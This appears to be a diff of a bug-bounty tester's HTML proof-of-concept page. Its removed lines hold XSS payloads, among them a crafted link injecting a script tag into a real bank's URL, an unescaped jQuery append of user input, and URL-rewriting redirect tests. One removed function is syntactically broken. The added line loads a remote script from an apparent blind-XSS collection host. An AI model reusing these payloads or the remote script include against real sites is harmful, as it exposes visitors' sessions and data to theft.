@@ -1,77 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title> Search Projects </title>
+<title> Search </title>
 </head>
 
 <body>
 <h1> Just another test for this page </h1>
-<p1> This will be a test for an XSS polygot </p1>
-  <p1>If you are here for my report on BugCrowd the link you are looking for is right below!</p1>
-<br>
-<br>
-  <img src="x" onerror="alert(document.domain)" />
-  <br>
-  <br>
-<script>
-function mario1(){
-alert(1);
-}
-</script>
-  <a href='https://www.bancatlan.hn/banca-de-empresas/?xlbi1"><script>alert(document.domain)</script>'>Click Me!</a>
-<br>
-  <br>
-<button type="button" onclick="mario1()">Test XSS</button>
-  
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js">
-    </script>
-  </head>
-  <body>  
-    <div class="info">
-      <label for="example">Enter Text
-      </label>
-      <input id="example" type="text"
-             name="Ntext" size="20">
-      <input id="sent" type="submit"  
-             value="Send"> 
-  </div>
-    <p id="para">      
-    </p>
-  </body>
-  <script>
-    window.onclick = function(e)
-    {   var id =  e.target.id;   
-     if (id === 'sent')  
-     { var txt = document.getElementById('example').value    
-       $( "#para" ).empty().append( txt );
-     }
-    }
-  </script>
-  <br>
-  <br>
-  <button onclick="myFunction()">Redirect with changed URL</button>
-
-<script>
-function myFunction() {
-  
-  console.log( window.location.href );  // whatever your current location href is
-  window.history.replaceState( {} , 'search.html', '/search.html?<script>');
-      var url = decodeURIComponent(window.location.href);
-      console.log(url);  // replaced
-      location.assign("https://tripadvisor.com/mediakit");
-}
-</script>
-<br>
-  <br>
-  <button onclick="mario()">ChangeUrl</button>
-  <script>
-    function mario(){
-      console.log( window.location.href );  // whatever your current location href is
-      window.history.replaceState( {} , 'search.html', '/search.html?<script>;
-      var url = decodeURIComponent(window.location.href);
-      console.log(url);  // replaced
-    }
-  </script>
+  <script src="https://moblig.xss.ht/"></script>
 </body>
 
 </html>
